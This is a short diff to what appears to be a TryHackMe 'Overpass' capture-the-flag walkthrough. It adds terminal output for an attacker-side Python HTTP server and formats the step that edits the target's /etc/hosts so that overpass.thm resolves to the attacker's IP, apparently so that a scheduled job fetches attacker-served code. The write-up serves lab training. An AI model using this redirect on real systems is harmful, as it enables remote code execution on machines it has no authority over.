@@ -717,10 +717,12 @@ Command: `python3 -m http.server 80`
 Output:
 
 ```shell
-
+┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
+└─$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-On the target, edit the /etc/hosts file by replacing the IP for the domain overpass.thm to the attacker IP address.
+On the target, edit the `/etc/hosts` file by replacing the IP for the domain `overpass.thm` to the attacker IP address.
 
 ```shell
 james@ip-10-65-152-254:~$ vi /etc/hosts
